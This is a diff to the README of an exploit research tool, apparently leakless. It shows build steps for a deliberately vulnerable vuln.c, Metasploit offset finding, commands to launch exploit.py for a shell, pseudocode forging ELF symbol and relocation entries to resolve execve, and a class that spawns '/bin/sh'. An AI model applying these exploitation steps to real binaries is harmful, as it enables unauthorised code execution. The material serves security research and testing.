@@ -3,52 +3,75 @@ How to test
 
 1. Build vuln.c
 
-    gcc -fno-stack-protector ../vuln.c -o /tmp/vuln -m32 -O2
+        gcc -fno-stack-protector vuln.c -o /tmp/vuln -m32 -O2
 
 2. Find the offset of the saved IP
 
-    ruby19 "$METASPLOIT/tools/pattern_create.rb" 256 | /tmp/vuln
-    dmesg | tail
-    ruby19 "$METASPLOIT/tools/pattern_offset.rb" $SEGFAULT_IP
+        ruby19 "$METASPLOIT/tools/pattern_create.rb" 256 | /tmp/vuln
+        dmesg | tail
+        ruby19 "$METASPLOIT/tools/pattern_offset.rb" $SEGFAULT_IP
 
 3. Launch the attack with the desired parameter
 
-    (python ./exploit.py /tmp/vuln --offset $OFFSET; echo ls) | /tmp/vuln
+        (python ./exploit.py /tmp/vuln --offset $OFFSET; echo ls) | /tmp/vuln
 
 You can also just dump to a JSON file all the necessary information to
 perform the exploit:
 
     python ./exploit.py /tmp/vuln --json
 
-For debugging information, use the `--debug` parameter.
+For debugging information, use the `--debug` parameter. For further
+information on the parameters use the `--help` parameter.
+
+The CMake build system will compile `vuln.c` for x86 and x86-64 with
+different protections enabled.  There's also a CTest testsuite which
+has been tested using the `ld.gold` linker and GCC 4.8.4. Different
+toolchains might require minor adjustments.
+
+To launch it just run:
+
+    mkdir leakless-build
+    cd leakless-build
+    cmake ../leakless
+    make
+    make test
+
+The build system has also the `length`, `json` and `ropl` targets
+which, respectively, produce the length of the generated exploit for
+each supported configuration and the JSON and ropl version of the
+exploit.
+
+    make length
+    make json
+    make ropl
 
 Basic idea
 ==========
 
-char *buffer = .bss;
-char *new_stack = buffer + 1024;
-int *rubbish = new_stack + 4;
+    char *buffer = .bss;
+    char *new_stack = buffer + 1024;
+    int *rubbish = new_stack + 4;
 
-strcpy(buffer, "execve");
-  *((int *) buffer) = 'exec';
-  *(((int *) buffer) + 1) = 've\0\0';
-char *name = buffer;
-buffer += strlen(buffer) + 1;
+    strcpy(buffer, "execve");
+    *((int *) buffer) = 'exec';
+    *(((int *) buffer) + 1) = 've\0\0';
+    char *name = buffer;
+    buffer += strlen(buffer) + 1;
 
-Elf32_Sym *symbol = (Elf32_Sym *) buffer;
-symbol->st_name = name - .dynstr;
-symbol->st_value = 0;
-symbol->st_info = 0;
-symbol->st_other = 0;
-symbol->st_shndx = 0;
-buffer += sizeof(*symbol);
+    Elf32_Sym *symbol = (Elf32_Sym *) buffer;
+    symbol->st_name = name - .dynstr;
+    symbol->st_value = 0;
+    symbol->st_info = 0;
+    symbol->st_other = 0;
+    symbol->st_shndx = 0;
+    buffer += sizeof(*symbol);
 
-Elf32_Rel *reloc = (Elf32_Rel *) buffer;
-reloc->r_offset = rubbish++;
-reloc->r_info = (R_386_JUMP_SLOT | (symbol - .dynsym) / sizeof(symbol));
-buffer += sizeof(reloc):
+    Elf32_Rel *reloc = (Elf32_Rel *) buffer;
+    reloc->r_offset = rubbish++;
+    reloc->r_info = (R_386_JUMP_SLOT | (symbol - .dynsym) / sizeof(symbol));
+    buffer += sizeof(reloc):
 
-pre_plt((reloc - .rel.plt) / sizeof(Elf32_Rel));
+    pre_plt((reloc - .rel.plt) / sizeof(Elf32_Rel));
 
 Helper classes
 ==============
@@ -66,8 +89,8 @@ Helper classes
   allows to allocate new `MemoryArea`s with the appropriate
   alignement.
 
-Exploit-derived classes
-=======================
+`Exploit`-derived classes
+=========================
 
 * `Exploit`: the base class, contains all the architecture- and
   platform-independent parts of the exploit. It keeps the list of the
@@ -82,8 +105,8 @@ Exploit-derived classes
   architecture-dependent parts, in particular gadgets and
   function-invocation logic.
 * `ExecveExploit`: very simple class implementing the logic to launch
-  an `execve`, so write a NULL pointer, a "/bin/sh\0" and explicitly
-  look for `execve`. Finally invoke it.
+  an `execve`, so write a `NULL` pointer, a `"/bin/sh\0"` and
+  explicitly look for `execve`. Finally invoke it.
 * `RawDumperExploit`: exploit useful to just collect the information
   necessary to perform the attack without actually generating the ROP
   chain. `RawDumperExploit.jump_to` will return as first result an
